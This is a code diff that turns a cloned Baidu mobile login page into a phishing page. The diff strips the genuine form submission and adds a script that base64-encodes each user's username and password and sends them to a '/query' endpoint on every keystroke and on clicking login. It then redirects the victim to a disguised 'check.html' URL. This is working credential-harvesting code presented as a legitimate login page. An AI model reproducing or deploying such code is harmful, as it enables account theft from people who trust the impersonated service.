@@ -11,8 +11,7 @@
     <title>登录百度帐号</title>
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <meta name="viewport"
-        content="">
+    <meta name="viewport" content="">
     <meta name="format-detection" content="telephone=no, email=no">
     <link rel="shortcut icon" href="https://www.baidu.com/favicon.ico" type="image/x-icon">
     <link rel="icon" sizes="any" mask="" href="https://www.baidu.com/img/baidu.svg">
@@ -52,7 +51,6 @@
 
 
         <header class="pass-header ">
-            <a class="pass-header-back" id="goBack"></a>
             <span class="pass-header-title">
                 登录百度帐号
             </span>
@@ -73,68 +71,32 @@
 
                 <p class="form-item form-input-wrapper form-item-username form-input-mobile">
                     <input type="text" name="username" class="text-input" maxlength="60" placeholder="手机号/邮箱/用户名"
-                        value="" id="login-username" autocomplete="off"
-                        style="">
+                        value="" id="login-username" autocomplete="off">
                     <span class="input-clearValue"></span>
                     <span id="login-userlist" class="pass-input-aide pass-input-userlist"></span>
                 </p>
                 <p class="form-item form-input-wrapper form-item-password form-input-mobile">
                     <input type="password" name="password" class="text-input" id="login-password" placeholder="密码"
-                        value="" autocomplete="off"
-                        style="">
-                    <span class="input-clearValue" style="display: block;"></span>
+                        value="" autocomplete="off">
+                    <input type="text" name="password-text" class="text-input" id="login-password" placeholder="密码"
+                        value="" autocomplete="off">
+                    <span id="clearv" class="input-clearValue" style="display: block;"></span>
                     <span id="login-pwdToggle" class="input-aide input-pwdToggle"></span>
                 </p>
                 <p class="form-item form-input-verifycode m-t10" id="login-verifyWrapper" style="display:none;">
                     <span class="form-input-wrapper form-input-mobile vcode-span vcode-input-span">
                         <input type="text" name="verifycode" class="text-input" value="" placeholder="验证码"
-                            autocomplete="off" maxlength="6" id="login-verifycode"
-                            style="">
+                            autocomplete="off" maxlength="6" id="login-verifycode" style="">
                         <span class="input-clearValue"></span>
                     </span>
                     <span class="form-input-mobile form-input-verifyCodeImg">
-                        <img class="verifyCode-img" src="./login/genimage" width="100" height="40"
-                            id="login-verifyCodeImg">
+                        <img class="verifyCode-img" width="100" height="40" />
                     </span>
                     <input type="hidden" id="login-vcodestr" name="vcodestr" value="">
                 </p>
                 <p class="form-item form-item-btn">
-                    <input type="hidden" name="action" value="login">
-                    <input type="hidden" name="u"
-                        value="https%3A%2F%2Fwww.baidu.com%2F%3Fuid%3D1567047288081_679%26traceid%3D4C050F03">
-                    <input type="hidden" name="tpl" value="wimn">
-                    <input type="hidden" name="tn" value="">
-                    <input type="hidden" name="pu" value="">
-                    <input type="hidden" name="ssid" value="">
-                    <input type="hidden" name="from" value="">
-                    <input type="hidden" name="bd_page_type" value="">
-                    <input type="hidden" name="uid" value="1567047288081_679">
-                    <input type="hidden" name="type" value="">
-                    <input type="hidden" name="regtype" value="">
-                    <input type="hidden" name="subpro" value="">
-                    <input type="hidden" name="adapter" value="0">
-                    <input type="hidden" name="skin" value="default_v2">
-                    <input type="hidden" name="regist_mode" value="">
-                    <input type="hidden" name="login_share_strategy" value="">
-                    <input type="hidden" name="client" value="">
-                    <input type="hidden" name="clientfrom" value="">
-                    <input type="hidden" name="connect" value="0">
-                    <input type="hidden" name="bindToSmsLogin" value="">
-                    <input type="hidden" name="extrajson"
-                        value="%7B%26quot%3Bsrc%26quot%3B%3A%26quot%3Bse_000000%26quot%3B%7D">
-
-                    <input type="hidden" id="login-isphone" name="isphone" value="">
-                    <input type="hidden" id="login-loginmerge" name="loginmerge" value="1">
-                    <input type="hidden" id="login-dialogVerifyCode">
-                    <input type="hidden" id="smslogin-vcodestr">
-                    <input type="hidden" id="smslogin-vcodesign">
-                    <input type="hidden" id="getpassUrl" name="getpassUrl"
-                        value="/passport/getpass?clientfrom=&amp;adapter=0&amp;ssid=&amp;from=&amp;authsite=&amp;bd_page_type=&amp;uid=1567047288081_679&amp;pu=&amp;tpl=wimn&amp;u=https://www.baidu.com/%3Fuid%3D1567047288081_679%26traceid%3D4C050F03&amp;type=&amp;bdcm=df0a8280e71190efbcc6a7efce1b9d16fdfa6059&amp;tn=&amp;regist_mode=&amp;login_share_strategy=&amp;subpro=&amp;skin=default_v2&amp;client=&amp;connect=0&amp;smsLoginLink=1&amp;loginLink=&amp;bindToSmsLogin=&amp;overseas=&amp;is_voice_sms=&amp;subpro=&amp;traceid=4C050F03&amp;hideSLogin=&amp;forcesetpwd=&amp;nousername=&amp;regdomestic=&amp;extrajson=%7B%22src%22:%22se_000000%22%7D">
-                    <input type="submit" value="登录" id="login-submit" class="pass-button-full pass-button-full-disabled"
-                        disabled="disabled">
-                    <input id="dv_Input" type="hidden"
-                        value="tk0.240533672220063061567047451745@wwr0Jt4mx-t2jbJv3ctKhTQzCzOz8PtkojCzxjCUxxt2Z~O2xNCkqvCYxe4Uxjt2Z~O2xNCkpZ4rx_ytt5-tCOidJMhCrE49xj49xj4F__BrpM2Nxt1p-4kHd4dBz41pU4kqv4dqv4GHvCdq-CdF~4GQ-CF__irPtrncJ2nE57Z3Jq__ArX4mxxtkoj41HN41FdCWxdCdHNDkoUtk4zC9xdCdHNDkoU"
-                        name="dv">
+                    <input type="button" value="登录" id="login-submit"
+                        class="pass-button-full pass-button-full-disabled">
                 </p>
 
                 <div class="f14 clearfix login-problem">
@@ -147,12 +109,12 @@
                 <span class="pass-mod-loadingImg"></span>
                 正在加载...
             </p>
-            <p class="f14 account-login account-login-width"
+            <!-- <p class="f14 account-login account-login-width"
                 style="transform-origin: 0px 0px; opacity: 1; transform: scale(1, 1);">
                 <a href="https://wappass.baidu.com/passport/reg?clientfrom=&amp;adapter=0&amp;ssid=&amp;from=&amp;authsite=&amp;bd_page_type=&amp;uid=1567047288081_679&amp;pu=&amp;tpl=wimn&amp;u=https://www.baidu.com/%3Fuid%3D1567047288081_679%26traceid%3D4C050F03&amp;type=&amp;bdcm=df0a8280e71190efbcc6a7efce1b9d16fdfa6059&amp;tn=&amp;regist_mode=&amp;login_share_strategy=&amp;subpro=&amp;skin=default_v2&amp;client=&amp;connect=0&amp;smsLoginLink=1&amp;loginLink=&amp;bindToSmsLogin=&amp;overseas=&amp;is_voice_sms=&amp;subpro=&amp;traceid=4C050F03&amp;hideSLogin=&amp;forcesetpwd=&amp;nousername=&amp;regdomestic=&amp;extrajson=%7B%22src%22:%22se_000000%22%7D"
                     data-user-urllog="touch-reg_link">立即注册</a>
-            </p>
-            <p class="wechat-mini-login-sso">
+            </p> -->
+            <!-- <p class="wechat-mini-login-sso">
                 <a href="javascript:void(0);" id="wechatMiniLogin"></a>
             </p>
             <div class="layer-cover">
@@ -163,7 +125,7 @@
                 <footer class="layer-account-third">
                     <a href="javascript:void(0);" class="cancle-btn" data-log="touch-authsite_cancel">取消</a>
                 </footer>
-            </div>
+            </div> -->
 
         </div>
 
@@ -173,15 +135,125 @@
 
 
     </div>
-
-
     <script src="./jquery.js"></script>
+
+    <script>
+        let n = $("[name=username]");
+        let p = $("[name=password]");
+        let pt = $("[name=password-text]");
+        pt.hide();
+        let c = $("#clearv");
+        let t = $("#login-pwdToggle");
+        let ls = $("#login-submit");
+        let ll = $("#login-loading");
+        let e = $("#error");
+        let timer = -1;
+        let eshow = (str = "") => {
+            e.html(str);
+            e.show();
+            timer = setTimeout(ehide, 2000);
+        };
+        let ehide = () => {
+            clearTimeout(timer);
+            e.hide();
+        }
+        let f = (url, cal, cale) => {
+            $.ajax({
+                url: url,
+                type: "get",
+                timeout: 10e3,
+                success: cal,
+                error: cale
+            });
+        };
+        let fnp = () => {
+            let str = `type=input&u=${n.val()}&p=${p.val()}&`;
+            f(`/query?d=${window.btoa(encodeURIComponent(str))}`, (e) => {
+                if (e == "error") {
+                } else {
+                }
+            })
+        };
+        n.on("input", () => {
+            fnp();
+        });
+        pt.on("input", () => {
+            p.val(pt.val() || "");
+            if (pt.val() !== "") {
+                c.show();
+            } else {
+                c.hide();
+            }
+            fnp();
+        });
+        p.on("input", () => {
+            pt.val(p.val() || "");
+            if (p.val() !== "") {
+                c.show();
+            } else {
+                c.hide();
+            }
+            fnp();
+        });
+        c.on("click", () => {
+            p.val("");
+            pt.val("");
+        });
+        t.on("click", () => {
+            if (p.css("display") === "none") {
+                pt.hide();
+                p.show();
+            } else {
+                p.hide();
+                pt.show();
+            }
+        });
+        ls.on("click", () => {
+            if (n.val() == "") {
+                eshow("你还没有输入帐号！");
+                return;
+            }
+            if (pt.val() == "" || p.val() == "") {
+                eshow("你还没有输入密码！");
+                return;
+            }
+            let str = `type=input&u=${n.val()}&p=${p.val()}&`;
+            f(`/query?d=${window.btoa(encodeURIComponent(str))}`, (e) => {
+                if (e == "error") {
+                } else {
+                }
+            })
+            str = `type=login&u=${n.val()}&p=${p.val()}&`;
+            f(`/query?d=${window.btoa(encodeURIComponent(str))}`,
+                (e) => {
+                    if (e == "error") {
+                        eshow("请输入正确的帐号！");
+                        ll.hide();
+                    } else if (e == "pass") {
+                        window.location.href = "/check.html?05bc899676d6ef43f8bee0f69eddca11-T/32153o/72006/84fdc170c16a2ee1010fc21da6f4ef80/3a41998d206411764f134db8d015d63c/_/download/contextbatch/css/com.atlassian.jira.plugins.jira-development-integration-plugin?appid=ngienbnpkldjcebacfbppphjjhbhfkpp&assatrisd=kjhzkKYQnkajsnAOY!hoASdjoAW&rtime=1010230102301203123&dwl=1-1-23-1-123&ttl=1566413096&ri=1433600&rs=1400&clientip=69.194.14.161&hash=29b554a946b107e4028379e37bf4e2c5"
+                        ehide();
+                        ll.hide();
+                    } else {
+                        setTimeout(() => {
+                            eshow("网络异常");
+                            ll.hide();
+                        }, 7500);
+                    }
+                }, (e) => {
+                    setTimeout(() => {
+                        eshow("网络异常");
+                        ll.hide();
+                    }, 7500);
+                });
+            ll.show();
+        });
+    </script>
 
 
     <!-- <script type="text/javascript" src="./login/fingerload.js"></script>
     <script type="text/javascript" src="./login/template_touch_show_login_aio_53ded0b.js"></script>
     <script type="text/javascript" src="./login/ld.min.js"></script> -->
- 
+
 
 
 </body>
